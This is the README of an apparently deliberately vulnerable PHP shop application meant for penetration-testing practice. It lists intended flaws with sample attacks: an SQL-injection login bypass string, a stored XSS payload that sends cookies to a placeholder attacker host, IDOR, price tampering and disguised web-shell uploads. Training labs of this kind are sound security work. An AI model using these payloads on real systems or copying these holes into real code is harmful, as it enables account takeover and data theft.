# GlitchMarket
GlithMarket is a vulnerable PHP web application made for PenTesters to practice on their hacking skills

# The Used Technologies
Back-end: MariaDB + PHP
Front-end: HTML + Tailwind CSS + JavaScript

# Some Ideas
### login.php -> Auth Bypass SQLi
Log in as admin using ' OR 1=1 -- - without knowing the password.

### product.php -> Stored XSS
Submit <script>fetch('http://attacker/?c='+document.cookie)</script> in a hardware review.

### profile.php?id=2 -> IDOR
Change the URL parameter to ?id=1 to view the admin's order history and private address.

### cart.php -> Client-Side Price Tampering
Intercept the checkout POST request in Burp Suite and change price=1999.99 to price=0.01.

### admin_upload.php -> Unrestricted File Upload
Upload a .php web shell disguised as a product image (shell.php.jpg or MIME spoofing).
